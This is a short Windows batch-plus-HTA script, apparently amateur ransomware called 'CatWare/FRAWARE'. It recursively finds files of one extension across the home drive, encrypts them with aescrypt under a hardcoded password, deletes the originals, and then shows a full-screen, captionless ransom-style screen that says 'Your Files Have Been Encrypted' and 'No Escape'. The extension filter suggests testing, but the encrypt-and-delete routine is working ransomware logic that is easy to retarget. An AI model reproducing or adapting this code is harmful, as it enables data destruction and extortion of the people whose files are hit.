:: Made by Frank
<!-- :: Batch Section
@Echo OFF
mode con:cols=50 lines=2
set pass=FrankSzd20

Title FRAWARE

echo Scanning. . . .
REM Change file extension *.123test for *.doc
FOR /R "%homedrive%\" %%X in (*.123test) DO (
REM echo %%X >> %homedrive%\Original.txt SafeMode
REM Rename "%%X" "%%~nX.bak" >NUL 2>&1 SafeMode   
aescrypt -e -p %pass% "%%X"
del "%%X"
)

REM Block Screen
cls
setlocal
for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"

-->

<html>
    <head>
        <title>CryptMSG</title>
    <hta:application id="oBVC" 
                     applicationname="CAT"  
                     version="1.0" 
                     maximizebutton="no" 
                     minimizebutton="no" 
                     sysmenu="no" 
                     Caption="no" 
                     windowstate="maximize"/> 
    <style>
        #texto2{
            padding-top: 19%;
            letter-spacing: 1px;
            text-align: center;
			}
    </style>
	<style> 
	body {
  background-image: url("https://smartsleepingtips.com/wp-content/uploads/2020/04/cat-biting-persons-hand.jpg");
}
</style> 
<body scroll="no">
</head>
    <font face="Lucida Console" size="4" color="white">
<center><p> - CatWare Crypt - </p></center>
<div id="texto2">
    Oops, Your Files Have Been Encrypted!<br>
    <br><br>
     Made by Frank Syd 20 <br>
    <br><br>
	 Now Enjoy Cat Mouth HAHA <br>
	<br><br>
    !!!No Escape!!! <br>
    <br><br><br> 
    <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100") >
</div>
</body>
</html>
